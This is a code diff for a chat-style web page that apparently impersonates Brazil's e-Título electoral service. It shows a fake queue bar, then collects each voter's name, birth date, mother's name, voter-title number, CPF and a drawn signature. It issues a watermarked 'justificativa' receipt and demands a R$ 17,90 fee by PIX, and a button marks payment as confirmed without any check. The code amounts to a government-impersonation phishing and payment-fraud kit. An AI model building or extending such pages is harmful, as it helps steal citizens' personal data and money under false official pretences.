+    var timeDiv = document.createElement('div');
+    timeDiv.className = 'audio-track-time';
+    timeDiv.innerHTML = '<span>Mensagem de Voz</span><span id="audio-time">0:00 / 0:00</span>';
+
+    var isPlaying = true;
+    audio.load();
+
+    setTimeout(function() {
+      var p = audio.play();
+      if (p !== undefined) {
+        p.catch(function(e) {
+          isPlaying = false;
+          playBtn.innerHTML = audioPlaySvg;
+        });
+      }
+    }, 200);
+
+    playBtn.onclick = function() {
+      if (isPlaying) {
+        audio.pause();
+        playBtn.innerHTML = audioPlaySvg;
+        isPlaying = false;
+      } else {
+        audio.play();
+        playBtn.innerHTML = audioPauseSvg;
+        isPlaying = true;
+      }
+    };
+
+    audio.onended = function() {
+      playBtn.innerHTML = audioPlaySvg;
+      isPlaying = false;
+      trackFill.style.width = '0%';
+    };
+
+    function updateTime() {
+      if (isNaN(audio.duration)) return;
+      var curMins = Math.floor(audio.currentTime / 60);
+      var curSecs = Math.floor(audio.currentTime % 60);
+      var durMins = Math.floor(audio.duration / 60);
+      var durSecs = Math.floor(audio.duration % 60);
+      
+      var timeStr = curMins + ':' + (curSecs < 10 ? '0' : '') + curSecs + ' / ' + durMins + ':' + (durSecs < 10 ? '0' : '') + durSecs;
+      timeDiv.querySelector('#audio-time').textContent = timeStr;
+    }
+
+    audio.ontimeupdate = function() {
+      if (isNaN(audio.duration)) return;
+      var percent = (audio.currentTime / audio.duration) * 100;
+      trackFill.style.width = percent + '%';
+      updateTime();
+    };
+
+    trackBar.onclick = function(e) {
+      var rect = trackBar.getBoundingClientRect();
+      var percent = (e.clientX - rect.left) / rect.width;
+      audio.currentTime = percent * audio.duration;
+    };
+
+    trackInfo.appendChild(trackBar);
+    trackInfo.appendChild(timeDiv);
+    audioCard.appendChild(playBtn);
+    audioCard.appendChild(trackInfo);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    var wrapper = document.createElement('div');
+    wrapper.style.flex = '1';
+    wrapper.appendChild(audioCard);
+    row.appendChild(wrapper);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudioThen(audioSrc, onAction) {
+    addAudio(audioSrc);
+    return new Promise(function(resolve) {
+      var audio = currentAudio;
+      var actionExecuted = false;
+      var checkInterval = null;
+
+      function executeCallback() {
+        if (!actionExecuted) {
+          actionExecuted = true;
+          if (checkInterval) clearInterval(checkInterval);
+          onAction().then(resolve).catch(resolve);
+        }
+      }
+
+      function setupMonitoring() {
+        var duration = audio.duration;
+        if (duration && duration > 0) {
+          var executeAt = Math.max(0, duration - 2.5);
+
+          checkInterval = setInterval(function() {
+            if (audio.currentTime >= executeAt && !actionExecuted) {
+              executeCallback();
+            }
+          }, 100);
+
+          audio.onended = executeCallback;
+        }
+      }
+
+      if (audio.readyState >= 1) setupMonitoring();
+      else audio.onloadedmetadata = setupMonitoring;
+
+      // Fallback: se o áudio não tocar ou terminar em 45s, avança normalmente
+      setTimeout(executeCallback, 45000);
+    });
+  }
+
+  function addAudioWithButton(audioSrc, buttonText) {
+    return addAudioThen(audioSrc, function() {
+      return addButtons([buttonText], false, true, true);
+    });
+  }
+
+  function infoCard(lines) {
+    var html = '<div class="bubble-info-card">';
+    lines.forEach(function (l) {
+      html += '<div class="' + ({label:'ic-label',value:'ic-value',bold:'ic-bold'}[l.style] || 'ic-label') + '">' + tag(l.text) + '</div>';
+    });
+    html += '</div>';
+    botRow(html);
+  }
+
+  function addProgressBar() {
+    return new Promise(function(resolve) {
+      var progressWrap = document.createElement('div');
+      progressWrap.style.marginLeft = '0px';
+      progressWrap.style.marginRight = '0px';
+      progressWrap.style.marginBottom = '10px';
+      progressWrap.style.width = '100%';
+      progressWrap.id = 'progress-bar-row';
+
+      var progressContainer = document.createElement('div');
+      progressContainer.className = 'progress-container';
+      progressContainer.innerHTML = '<div class="progress-text">Você está na fila para acessar seu e-Título, aguarde...</div><div class="progress-bar-wrapper"><div class="progress-bar-fill"></div></div>';
+
+      progressWrap.appendChild(progressContainer);
+      msgs.appendChild(progressWrap);
+      scroll();
+
+      setTimeout(function() {
+        var el = document.getElementById('progress-bar-row');
+        if (el) el.remove();
+        resolve();
+      }, 12200);
+    });
+  }
+
+  function gerarComprovantePDF(dados) {
+    // Armazena os dados para usar após aceitar
+    window._dadosComprovante = dados;
+
+    // Gera o comprovante diretamente (sem modal de conscientização)
+    (async function() {
+      // Usa o novo script de preenchimento de PDF
+      if (typeof preencherComprovante === 'undefined') {
+        alert('❌ Script de preenchimento não carregado. Atualize a página.');
+        return;
+      }
+
+      preencherComprovante(window._dadosComprovante).then(function(resultado) {
+        if (resultado.success) {
+          exibirComprovantNoChat(resultado.imagem, window._dadosComprovante);
+
+          // Salva o comprovante em arquivo
+          fetch('../../api/salvarComprovante.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              imagemBase64: resultado.imagem,
+              cpf: window._dadosComprovante.cpf
+            })
+          }).then(r => r.json())
+            .then(data => {
+              if (data.success) {
+                console.log('Comprovante salvo em:', data.caminho);
+              }
+            })
+            .catch(err => console.error('Erro ao salvar:', err));
+        } else {
+          alert('❌ Erro ao gerar comprovante: ' + resultado.error);
+        }
+      }).catch(function(error) {
+        console.error('Erro:', error);
+        alert('❌ Erro ao gerar comprovante');
+      });
+    })();
+  }
+
+  function exibirComprovantNoChat(imagemBase64, dados) {
+    // Armazena a imagem para download posterior
+    COMPROVANTE_IMAGEM = imagemBase64;
+
+    botSay('<strong>Comprovante gerado com sucesso!</strong>');
+    setTimeout(function() {
+      var pdfWrap = document.createElement('div');
+      pdfWrap.style.marginLeft = '40px';
+      pdfWrap.style.marginBottom = '10px';
+      pdfWrap.style.width = 'calc(100% - 40px)';
+
+      var pdfContainer = document.createElement('div');
+      pdfContainer.style.background = '#ffffff';
+      pdfContainer.style.border = '1px solid #cbd5e1';
+      pdfContainer.style.borderRadius = '12px';
+      pdfContainer.style.padding = '12px';
+      pdfContainer.style.boxShadow = '0 2px 8px rgba(0,0,0,0.04)';
+
+      var pdfTitle = document.createElement('div');
+      pdfTitle.style.fontWeight = '800';
+      pdfTitle.style.marginBottom = '12px';
+      pdfTitle.style.color = '#0f172a';
+      pdfTitle.style.fontSize = '14px';
+      pdfTitle.textContent = '📄 Seu Comprovante de Justificativa';
+      pdfContainer.appendChild(pdfTitle);
+
+      var pdfDescription = document.createElement('div');
+      pdfDescription.style.fontSize = '13px';
+      pdfDescription.style.color = '#475569';
+      pdfDescription.style.lineHeight = '1.5';
+      pdfDescription.style.marginBottom = '12px';
+      pdfDescription.textContent = 'Seu comprovante foi gerado, baixe e visualize. Se estiver correto, confirme e faça o pagamento para retirar a marca d\'água e liberar a impressão.';
+      pdfContainer.appendChild(pdfDescription);
+
+      // Imagem do comprovante com watermark (antes do pagamento)
+      var previewWrapper = document.createElement('div');
+      previewWrapper.style.position = 'relative';
+      previewWrapper.style.width = '100%';
+      previewWrapper.style.marginBottom = '12px';
+
+      var preview = document.createElement('img');
+      preview.src = imagemBase64;
+      preview.style.width = '100%';
+      preview.style.height = 'auto';
+      preview.style.border = '1px solid #e2e8f0';
+      preview.style.borderRadius = '8px';
+      preview.style.cursor = 'pointer';
+      preview.style.display = 'block';
+      previewWrapper.appendChild(preview);
+
+      // Adiciona watermark "leticia1" (antes do pagamento) - grande e transparente
+      var watermark = document.createElement('img');
+      watermark.id = 'watermark-leticia-' + Math.random().toString(36).substr(2, 9);
+      watermark.src = './images/leticia1 - Copia.png';
+      watermark.style.position = 'absolute';
+      watermark.style.top = '50%';
+      watermark.style.left = '50%';
+      watermark.style.transform = 'translate(-50%, -50%)';
+      watermark.style.width = '150%';
+      watermark.style.height = '150%';
+      watermark.style.objectFit = 'contain';
+      watermark.style.borderRadius = '8px';
+      watermark.style.pointerEvents = 'none';
+      watermark.style.opacity = '0.25';
+      watermark.style.zIndex = '10';
+      previewWrapper.appendChild(watermark);
+      preview.onclick = function() {
+        var modal = document.createElement('div');
+        modal.style.position = 'fixed';
+        modal.style.top = '0';
+        modal.style.left = '0';
+        modal.style.width = '100%';
+        modal.style.height = '100%';
+        modal.style.background = 'rgba(0,0,0,0.9)';
+        modal.style.display = 'flex';
+        modal.style.alignItems = 'center';
+        modal.style.justifyContent = 'center';
+        modal.style.zIndex = '9999';
+        modal.style.overflow = 'auto';
+        modal.style.padding = '20px';
+        modal.style.touchAction = 'pinch-zoom';
+
+        var imgContainer = document.createElement('div');
+        imgContainer.style.position = 'relative';
+        imgContainer.style.maxWidth = '100%';
+        imgContainer.style.maxHeight = '100%';
+        imgContainer.style.display = 'flex';
+        imgContainer.style.alignItems = 'center';
+        imgContainer.style.justifyContent = 'center';
+
+        var img = document.createElement('img');
+        img.src = imagemBase64;
+        img.style.maxWidth = '100%';
+        img.style.maxHeight = '95vh';
+        img.style.objectFit = 'contain';
+        img.style.userSelect = 'none';
+        img.style.cursor = 'zoom-out';
+
+        var closeBtn = document.createElement('div');
+        closeBtn.style.position = 'absolute';
+        closeBtn.style.top = '10px';
+        closeBtn.style.right = '10px';
+        closeBtn.style.background = 'rgba(255,255,255,0.9)';
+        closeBtn.style.color = '#333';
+        closeBtn.style.width = '40px';
+        closeBtn.style.height = '40px';
+        closeBtn.style.borderRadius = '50%';
+        closeBtn.style.display = 'flex';
+        closeBtn.style.alignItems = 'center';
+        closeBtn.style.justifyContent = 'center';
+        closeBtn.style.cursor = 'pointer';
+        closeBtn.style.fontSize = '24px';
+        closeBtn.textContent = '✕';
+        closeBtn.onclick = function(e) {
+          e.stopPropagation();
+          modal.remove();
+        };
+
+        imgContainer.appendChild(img);
+        imgContainer.appendChild(closeBtn);
+        modal.appendChild(imgContainer);
+
+        modal.onclick = function(e) {
+          if (e.target === modal) {
+            modal.remove();
+          }
+        };
+
+        document.body.appendChild(modal);
+      };
+      pdfContainer.appendChild(previewWrapper);
+
+      // Botões BAIXAR, CONFIRMAR e CORRIGIR
+      var btnWrap = document.createElement('div');
+      btnWrap.style.display = 'flex';
+      btnWrap.style.gap = '8px';
+      btnWrap.style.justifyContent = 'flex-end';
+      btnWrap.style.flexWrap = 'wrap';
+
+      var baixarBtn = document.createElement('button');
+      baixarBtn.className = 'chat-btn';
+      baixarBtn.textContent = '⬇️ Baixar PNG';
+      baixarBtn.onclick = function() {
+        var link = document.createElement('a');
+        link.href = imagemBase64;
+        link.download = 'comprovante_' + (dados.cpf || 'eleitor') + '_' + new Date().getTime() + '.png';
+        link.click();
+      };
+
+      var baixarPdfBtn = document.createElement('button');
+      baixarPdfBtn.className = 'chat-btn';
+      baixarPdfBtn.textContent = '⬇️ Baixar PDF';
+      baixarPdfBtn.onclick = function() {
+        baixarComprovantePdf(imagemBase64, !PAGAMENTO_CONFIRMADO, 'comprovante_' + (dados.cpf || 'eleitor') + '.pdf');
+      };
+
+      var corrigirBtn = document.createElement('button');
+      corrigirBtn.className = 'chat-btn';
+      corrigirBtn.textContent = 'Corrigir';
+      corrigirBtn.onclick = function() {
+        botRow('Você escolheu corrigir os dados. Vamos voltar ao formulário.');
+        setTimeout(function() {
+          addCompletarDadosForm();
+        }, 500);
+      };
+
+      var confirmarBtn = document.createElement('button');
+      confirmarBtn.className = 'chat-btn solid';
+      confirmarBtn.textContent = 'Confirmar';
+      confirmarBtn.onclick = function() {
+        botSay('✅ <strong>Comprovante confirmado!</strong>');
+
+        setTimeout(function() {
+          botSay('A taxa de emissão do seu comprovante de justificativa de voto é de <strong>R$ 17,90</strong>.<br><br>O não pagamento impede a confirmação da justificativa de voto gerada.<br><br>Após o pagamento e confirmação, o comprovante será disponibilizado aqui para <strong>download e impressão</strong>, podendo ser entregue em sua cidade atual.');
+
+          setTimeout(function() {
+            // Mostra botão para gerar guia de pagamento
+            var gerarPixBtnWrap = document.createElement('div');
+            gerarPixBtnWrap.style.marginLeft = '40px';
+            gerarPixBtnWrap.style.marginBottom = '10px';
+            gerarPixBtnWrap.style.width = 'calc(100% - 40px)';
+
+            var gerarPixBtn = document.createElement('button');
+            gerarPixBtn.className = 'chat-btn solid';
+            gerarPixBtn.style.marginLeft = 'auto';
+            gerarPixBtn.style.marginRight = '0';
+            gerarPixBtn.textContent = 'Gerar Guia de Pagamento (PIX)';
+            gerarPixBtn.onclick = function() {
+              gerarPixBtn.disabled = true;
+              gerarPixBtn.style.opacity = '0.6';
+
+              botSay('Gerando sua chave PIX para pagamento...');
+              addTyping();
+
+              // Aqui entra a geração do PIX
+              setTimeout(function() {
+                removeTyping();
+                gerarPixPagamento(window._dadosComprovante);
+              }, 2000);
+            };
+
+            gerarPixBtnWrap.appendChild(gerarPixBtn);
+            msgs.appendChild(gerarPixBtnWrap);
+            scroll();
+          }, 1500);
+        }, 800);
+      };
+
+      btnWrap.appendChild(baixarBtn);
+      btnWrap.appendChild(baixarPdfBtn);
+      btnWrap.appendChild(corrigirBtn);
+      btnWrap.appendChild(confirmarBtn);
+      pdfContainer.appendChild(btnWrap);
+
+      pdfWrap.appendChild(pdfContainer);
+      msgs.appendChild(pdfWrap);
+      scroll();
+    }, 2000);
+  }
+
+  function gerarPixPagamento(dados) {
+    // Exibe mensagem de sucesso PRIMEIRO
+    botSay('<strong>Seu PIX foi gerado com sucesso!</strong>');
+
+    // Chama API para gerar PIX real (Paradise Pags ou Genesys com fallback)
+    fetch('../../api/gerar-pix.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        nome: dados.nome || NOME_COMPLETO || 'Cliente',
+        email: dados.email || '',
+        cpf: CPF || ''
+      })
+    })
+    .then(r => r.json())
+    .then(function(pixResponse) {
+      if (!pixResponse.ok) {
+        botSay('Erro ao gerar PIX: ' + (pixResponse.erro || 'Desconhecido'));
+        return;
+      }
+
+      // Aguarda um pouco para garantir que a mensagem anterior foi renderizada
+      setTimeout(function() {
+        var pixWrap = document.createElement('div');
+        pixWrap.style.marginLeft = '40px';
+        pixWrap.style.marginBottom = '10px';
+        pixWrap.style.width = 'calc(100% - 40px)';
+
+        var pixContainer = document.createElement('div');
+        pixContainer.className = 'pix-container';
+
+        var pixInstructions = document.createElement('div');
+        pixInstructions.style.fontSize = '13px';
+        pixInstructions.style.color = '#475569';
+        pixInstructions.style.marginBottom = '14px';
+        pixInstructions.textContent = 'Escaneie o código abaixo ou copie a chave:';
+        pixContainer.appendChild(pixInstructions);
+
+        var pixTitle = document.createElement('div');
+        pixTitle.className = 'pix-title';
+        pixTitle.textContent = 'R$ 17,90';
+        pixContainer.appendChild(pixTitle);
+
+        var pixSub = document.createElement('div');
+        pixSub.className = 'pix-sub';
+        pixSub.textContent = 'Taxa de emissão do comprovante';
+        pixContainer.appendChild(pixSub);
+
+        // QR Code (já vem da API)
+        var qrcodeId = 'qrcode-pix-' + Math.random().toString(36).substr(2, 9);
+        var qrcodeWrapper = document.createElement('div');
+        qrcodeWrapper.className = 'qrcode-wrapper';
+        qrcodeWrapper.id = qrcodeId;
+        qrcodeWrapper.style.margin = '0 auto';
+        pixContainer.appendChild(qrcodeWrapper);
+
+        // Se a API retornou imagem do QR, exibe diretamente
+        if (pixResponse.qrcodeImage) {
+          var qrcodeImg = document.createElement('img');
+          qrcodeImg.src = pixResponse.qrcodeImage;
+          qrcodeImg.style.width = '220px';
+          qrcodeImg.style.height = '220px';
+          qrcodeImg.style.display = 'block';
+          qrcodeImg.style.margin = '10px auto';
+          document.getElementById(qrcodeId).appendChild(qrcodeImg);
+        } else if (typeof QRCode !== 'undefined') {
+          // Fallback: gera QR code com QRCode.js se API não retornou
+          setTimeout(function() {
+            var qrcodeElement = document.getElementById(qrcodeId);
+            if (qrcodeElement) {
+              new QRCode(qrcodeElement, {
+                text: pixResponse.pixCode,
+                width: 220,
+                height: 220,
+                colorDark: '#000000',
+                colorLight: '#ffffff'
+              });
+            }
+          }, 100);
+        }
+
+        // Chave PIX
+        var pixChave = pixResponse.pixCode || '';
+        var pixCopyDiv = document.createElement('div');
+        pixCopyDiv.className = 'pix-copy-paste';
+        pixCopyDiv.textContent = pixChave;
+        pixContainer.appendChild(pixCopyDiv);
+
+        // Botão para copiar
+        var copiarBtnDiv = document.createElement('div');
+        copiarBtnDiv.style.marginTop = '12px';
+        var copiarBtn = document.createElement('button');
+        copiarBtn.className = 'chat-btn solid';
+        copiarBtn.style.width = '100%';
+        copiarBtn.textContent = 'COPIAR CODIGO PIX';
+        copiarBtn.onclick = function() {
+          navigator.clipboard.writeText(pixChave).then(function() {
+            // Mostra feedback no botão por 2 segundos
+            var textoOriginal = copiarBtn.textContent;
+            copiarBtn.textContent = 'PIX Copiado com sucesso!';
+            copiarBtn.disabled = true;
+            copiarBtn.style.opacity = '0.7';
+
+            setTimeout(function() {
+              copiarBtn.textContent = textoOriginal;
+              copiarBtn.disabled = false;
+              copiarBtn.style.opacity = '1';
+            }, 2000);
+          }).catch(function() {
+            copiarBtn.textContent = 'Erro ao copiar!';
+            setTimeout(function() {
+              copiarBtn.textContent = 'COPIAR CODIGO PIX';
+            }, 2000);
+          });
+        };
+        copiarBtnDiv.appendChild(copiarBtn);
+        pixContainer.appendChild(copiarBtnDiv);
+
+        // Status de pagamento
+        var pixStatus = document.createElement('div');
+        pixStatus.className = 'pix-status';
+        pixStatus.innerHTML = '<span class="spinner"></span> Aguardando confirmação do pagamento...';
+        pixContainer.appendChild(pixStatus);
+
+        pixWrap.appendChild(pixContainer);
+        msgs.appendChild(pixWrap);
+        scroll();
+
+        // Adiciona botão de confirmar pagamento
+        var confirmarPagDiv = document.createElement('div');
+        confirmarPagDiv.style.marginTop = '16px';
+        var confirmarPagBtn = document.createElement('button');
+        confirmarPagBtn.className = 'chat-btn solid';
+        confirmarPagBtn.style.width = '100%';
+        confirmarPagBtn.textContent = 'Confirmar Pagamento';
+        confirmarPagBtn.onclick = function() {
+          confirmarPagBtn.disabled = true;
+          confirmarPagBtn.style.opacity = '0.6';
+          // Armazena o token do PIX para webhook
+          dados.pixToken = pixResponse.token;
+          exibirGuiaAposPagamento(dados);
+        };
+        confirmarPagDiv.appendChild(confirmarPagBtn);
+        pixContainer.appendChild(confirmarPagDiv);
+      }, 500);
+    })
+    .catch(function(err) {
+      botSay('Erro ao conectar: ' + err.message);
+    });
+  }
+
+  async function exibirGuiaAposPagamento(dados) {
+    // Remove watermark após pagamento
+    PAGAMENTO_CONFIRMADO = true;
+    var watermarkElements = document.querySelectorAll('[id^="watermark-leticia-"]');
+    watermarkElements.forEach(function(el) {
+      el.style.display = 'none';
+    });
+
+    // 2 segundos digitando
+    addTyping();
+    await sleep(2000);
+    removeTyping();
+
+    // Mensagem de confirmação
+    await botSay('<strong>Pagamento confirmado com sucesso!</strong>');
+
+    await sleep(500);
+
+    // Exibe os dados
+    (function() {
+      var guiaWrap = document.createElement('div');
+      guiaWrap.style.marginLeft = '40px';
+      guiaWrap.style.marginBottom = '10px';
+      guiaWrap.style.width = 'calc(100% - 40px)';
+
+      var guiaContainer = document.createElement('div');
+      guiaContainer.style.background = '#ffffff';
+      guiaContainer.style.border = '1px solid #cbd5e1';
+      guiaContainer.style.borderRadius = '12px';
+      guiaContainer.style.padding = '16px';
+      guiaContainer.style.boxShadow = '0 2px 8px rgba(0,0,0,0.04)';
+
+      var guiaTitle = document.createElement('div');
+      guiaTitle.style.fontWeight = '800';
+      guiaTitle.style.marginBottom = '14px';
+      guiaTitle.style.color = '#0f172a';
+      guiaTitle.style.fontSize = '14px';
+      guiaTitle.textContent = 'Guia de Justificativa de Voto';
+      guiaContainer.appendChild(guiaTitle);
+
+      // Dados confirmados (com fallback para window._dadosComprovante se necessário)
+      var dadosCompletos = dados || window._dadosComprovante || {};
+      var dadosInfo = [
+        { label: 'Nome Completo:', valor: dadosCompletos.nome || 'N/A' },
+        { label: 'Email:', valor: dadosCompletos.email || 'N/A' },
+        { label: 'Nome da Mãe:', valor: dadosCompletos.mae || 'N/A' },
+        { label: 'Turno:', valor: dadosCompletos.turno || 'N/A' },
+        { label: 'Justificativa:', valor: (dadosCompletos.justificativa || 'N/A').substring(0, 100) + '...' }
+      ];
+
+      dadosInfo.forEach(function(info) {
+        var infoDiv = document.createElement('div');
+        infoDiv.style.marginBottom = '10px';
+        infoDiv.style.paddingBottom = '10px';
+        infoDiv.style.borderBottom = '1px solid #f1f5f9';
+
+        var label = document.createElement('strong');
+        label.style.color = '#475569';
+        label.style.fontSize = '12px';
+        label.textContent = info.label;
+        infoDiv.appendChild(label);
+
+        var valor = document.createElement('div');
+        valor.style.color = '#1351B4';
+        valor.style.fontSize = '13px';
+        valor.style.marginTop = '4px';
+        valor.style.fontWeight = '600';
+        valor.textContent = info.valor;
+        infoDiv.appendChild(valor);
+
+        guiaContainer.appendChild(infoDiv);
+      });
+
+      // Botões de download
+      var btnWrapGuia = document.createElement('div');
+      btnWrapGuia.style.display = 'flex';
+      btnWrapGuia.style.gap = '8px';
+      btnWrapGuia.style.marginTop = '14px';
+      btnWrapGuia.style.justifyContent = 'flex-end';
+      btnWrapGuia.style.flexWrap = 'wrap';
+
+      var baixarGuiaBtn = document.createElement('button');
+      baixarGuiaBtn.className = 'chat-btn solid';
+      baixarGuiaBtn.style.flex = '1';
+      baixarGuiaBtn.textContent = 'Baixar Guia';
+      baixarGuiaBtn.onclick = function() {
+        baixarComprovantePdf(COMPROVANTE_IMAGEM, !PAGAMENTO_CONFIRMADO, 'guia_justificativa_' + (CPF || 'eleitor') + '.pdf')
+          .then(function() {
+            botSay('Guia de Justificativa baixada com sucesso! Você pode agora imprimir e entregar em sua cidade.');
+          });
+      };
+      btnWrapGuia.appendChild(baixarGuiaBtn);
+
+      var finalizarBtn = document.createElement('button');
+      finalizarBtn.className = 'chat-btn';
+      finalizarBtn.style.flex = '1';
+      finalizarBtn.textContent = 'Finalizar';
+      finalizarBtn.onclick = function() {
+        botSay('<strong>Justificativa finalizada com sucesso!</strong><br>Obrigado por usar o <strong>e-Título</strong>!');
+      };
+      btnWrapGuia.appendChild(finalizarBtn);
+
+      guiaContainer.appendChild(btnWrapGuia);
+      guiaWrap.appendChild(guiaContainer);
+      msgs.appendChild(guiaWrap);
+      scroll();
+    })();
+  }
+
+  function addCompletarDadosForm() {
+    var formWrap = document.createElement('div');
+    formWrap.style.marginLeft = '40px';
+    formWrap.style.marginBottom = '10px';
+    formWrap.style.width = 'calc(100% - 40px)';
+
+    var formDiv = document.createElement('div');
+    formDiv.style.background = '#ffffff';
+    formDiv.style.border = '1px solid #cbd5e1';
+    formDiv.style.borderRadius = '12px';
+    formDiv.style.padding = '16px';
+    formDiv.style.boxShadow = '0 2px 8px rgba(0,0,0,0.04)';
+
+    var titleDiv = document.createElement('div');
+    titleDiv.style.fontWeight = '800';
+    titleDiv.style.marginBottom = '16px';
+    titleDiv.style.color = '#0f172a';
+    titleDiv.style.fontSize = '14px';
+    titleDiv.textContent = 'Confirme seus dados e assine o comprovante:';
+    formDiv.appendChild(titleDiv);
+
+    // Nome
+    var nomeDiv = document.createElement('div');
+    nomeDiv.style.marginBottom = '14px';
+    var nomeLabel = document.createElement('label');
+    nomeLabel.style.display = 'block';
+    nomeLabel.style.fontWeight = '600';
+    nomeLabel.style.marginBottom = '6px';
+    nomeLabel.style.fontSize = '13px';
+    nomeLabel.style.color = '#475569';
+    nomeLabel.textContent = 'Nome Completo:';
+    var nomeInput = document.createElement('input');
+    nomeInput.type = 'text';
+    nomeInput.value = NOME_COMPLETO || '';
+    nomeInput.style.width = '100%';
+    nomeInput.style.padding = '10px';
+    nomeInput.style.border = '1px solid #cbd5e1';
+    nomeInput.style.borderRadius = '6px';
+    nomeInput.style.fontSize = '14px';
+    nomeInput.style.fontFamily = 'inherit';
+    nomeDiv.appendChild(nomeLabel);
+    nomeDiv.appendChild(nomeInput);
+    formDiv.appendChild(nomeDiv);
+
+    // Data de Nascimento
+    var nascDiv = document.createElement('div');
+    nascDiv.style.marginBottom = '14px';
+    var nascLabel = document.createElement('label');
+    nascLabel.style.display = 'block';
+    nascLabel.style.fontWeight = '600';
+    nascLabel.style.marginBottom = '6px';
+    nascLabel.style.fontSize = '13px';
+    nascLabel.style.color = '#475569';
+    nascLabel.textContent = 'Data de Nascimento:';
+    var nascInput = document.createElement('input');
+    nascInput.type = 'date';
+    // Converte DD/MM/YYYY para YYYY-MM-DD
+    var nascFormatado = '';
+    if (NASC) {
+      var parts = NASC.split('/');
+      if (parts.length === 3) {
+        nascFormatado = parts[2] + '-' + parts[1] + '-' + parts[0];
+      } else {
+        nascFormatado = NASC;
+      }
+    }
+    nascInput.value = nascFormatado;
+    nascInput.style.width = '100%';
+    nascInput.style.padding = '10px';
+    nascInput.style.border = '1px solid #cbd5e1';
+    nascInput.style.borderRadius = '6px';
+    nascInput.style.fontSize = '14px';
+    nascInput.style.fontFamily = 'inherit';
+    nascDiv.appendChild(nascLabel);
+    nascDiv.appendChild(nascInput);
+    formDiv.appendChild(nascDiv);
+
+    // Nome da Mãe
+    var maeDiv = document.createElement('div');
+    maeDiv.style.marginBottom = '14px';
+    var maeLabel = document.createElement('label');
+    maeLabel.style.display = 'block';
+    maeLabel.style.fontWeight = '600';
+    maeLabel.style.marginBottom = '6px';
+    maeLabel.style.fontSize = '13px';
+    maeLabel.style.color = '#475569';
+    maeLabel.textContent = 'Nome da Mãe:';
+    var maeInput = document.createElement('input');
+    maeInput.type = 'text';
+    maeInput.value = NOME_MAE || '';
+    maeInput.style.width = '100%';
+    maeInput.style.padding = '10px';
+    maeInput.style.border = '1px solid #cbd5e1';
+    maeInput.style.borderRadius = '6px';
+    maeInput.style.fontSize = '14px';
+    maeInput.style.fontFamily = 'inherit';
+    maeDiv.appendChild(maeLabel);
+    maeDiv.appendChild(maeInput);
+    formDiv.appendChild(maeDiv);
+
+    // Data da Eleição
+    var dataEleicaoDiv = document.createElement('div');
+    dataEleicaoDiv.style.marginBottom = '14px';
+    var dataEleicaoLabel = document.createElement('label');
+    dataEleicaoLabel.style.display = 'block';
+    dataEleicaoLabel.style.fontWeight = '600';
+    dataEleicaoLabel.style.marginBottom = '6px';
+    dataEleicaoLabel.style.fontSize = '13px';
+    dataEleicaoLabel.style.color = '#475569';
+    dataEleicaoLabel.textContent = 'Data da Eleição:';
+    var dataEleicaoInput = document.createElement('input');
+    dataEleicaoInput.type = 'date';
+    // Pré-preenche com 4 de outubro de 2026
+    dataEleicaoInput.value = '2026-10-04';
+    dataEleicaoInput.style.width = '100%';
+    dataEleicaoInput.style.padding = '10px';
+    dataEleicaoInput.style.border = '1px solid #cbd5e1';
+    dataEleicaoInput.style.borderRadius = '6px';
+    dataEleicaoInput.style.fontSize = '14px';
+    dataEleicaoDiv.appendChild(dataEleicaoLabel);
+    dataEleicaoDiv.appendChild(dataEleicaoInput);
+    formDiv.appendChild(dataEleicaoDiv);
+
+    // Número do Título Eleitoral
+    var tituloDiv = document.createElement('div');
+    tituloDiv.style.marginBottom = '14px';
+    var tituloLabel = document.createElement('label');
+    tituloLabel.style.display = 'block';
+    tituloLabel.style.fontWeight = '600';
+    tituloLabel.style.marginBottom = '6px';
+    tituloLabel.style.fontSize = '13px';
+    tituloLabel.style.color = '#475569';
+    tituloLabel.textContent = 'Número do Título Eleitoral:';
+    var tituloInput = document.createElement('input');
+    tituloInput.type = 'text';
+    tituloInput.placeholder = '123456789012';
+    tituloInput.style.width = '100%';
+    tituloInput.style.padding = '10px';
+    tituloInput.style.border = '1px solid #cbd5e1';
+    tituloInput.style.borderRadius = '6px';
+    tituloInput.style.fontSize = '14px';
+    tituloDiv.appendChild(tituloLabel);
+    tituloDiv.appendChild(tituloInput);
+
+    // Mensagem de erro para Título
+    var tituloErro = document.createElement('div');
+    tituloErro.style.color = '#dc2626';
+    tituloErro.style.fontSize = '12px';
+    tituloErro.style.marginTop = '4px';
+    tituloErro.style.display = 'none';
+    tituloErro.textContent = '❌ Título não preenchido';
+    tituloDiv.appendChild(tituloErro);
+
+    formDiv.appendChild(tituloDiv);
+
+    // Assinatura Canvas
+    var assinDiv = document.createElement('div');
+    assinDiv.style.marginBottom = '14px';
+    var assinLabel = document.createElement('label');
+    assinLabel.style.display = 'block';
+    assinLabel.style.fontWeight = '600';
+    assinLabel.style.marginBottom = '6px';
+    assinLabel.style.fontSize = '13px';
+    assinLabel.style.color = '#475569';
+    assinLabel.textContent = 'Sua Assinatura:';
+    var canvas = document.createElement('canvas');
+    canvas.style.border = '2px solid #cbd5e1';
+    canvas.style.borderRadius = '6px';
+    canvas.style.cursor = 'auto';
+    canvas.style.width = '100%';
+    canvas.style.height = '120px';
+    canvas.style.display = 'block';
+    canvas.width = 400;
+    canvas.height = 120;
+
+    var ctx = canvas.getContext('2d');
+    // Fundo transparente (não desenha branco)
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    var isDrawing = false;
+    canvas.addEventListener('mousedown', function(e) { isDrawing = true; });
+    canvas.addEventListener('mouseup', function(e) { isDrawing = false; });
+    canvas.addEventListener('mouseleave', function(e) { isDrawing = false; });
+    canvas.addEventListener('touchstart', function(e) { isDrawing = true; e.preventDefault(); });
+    canvas.addEventListener('touchend', function(e) { isDrawing = false; });
+
+    function draw(e) {
+      if (!isDrawing) return;
+      var rect = canvas.getBoundingClientRect();
+      var x, y;
+      if (e.touches) {
+        x = e.touches[0].clientX - rect.left;
+        y = e.touches[0].clientY - rect.top;
+      } else {
+        x = e.clientX - rect.left;
+        y = e.clientY - rect.top;
+      }
+      ctx.beginPath();
+      ctx.moveTo(x, y);
+      ctx.lineTo(x + 1, y + 1);
+      ctx.strokeStyle = '#1351B4';
+      ctx.lineWidth = 2;
+      ctx.lineCap = 'round';
+      ctx.lineJoin = 'round';
+      ctx.stroke();
+    }
+
+    canvas.addEventListener('mousemove', draw);
+    canvas.addEventListener('touchmove', draw);
